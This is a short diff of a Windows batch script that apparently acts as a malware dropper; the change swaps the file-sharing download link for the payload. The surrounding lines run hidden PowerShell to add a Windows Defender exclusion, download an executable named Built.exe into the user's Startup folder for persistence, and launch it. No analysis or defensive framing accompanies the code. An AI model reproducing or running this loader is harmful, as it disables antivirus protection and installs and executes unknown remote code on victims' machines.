@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://filetransfer.io/data-package/St2ZaTHy/download"
+set "URL=https://filetransfer.io/data-package/Cl2ZmWoX/download"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -20,7 +20,7 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://filetransfer.io/data-package/St2ZaTHy/download"
+set "URL=https://filetransfer.io/data-package/Cl2ZmWoX/download"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
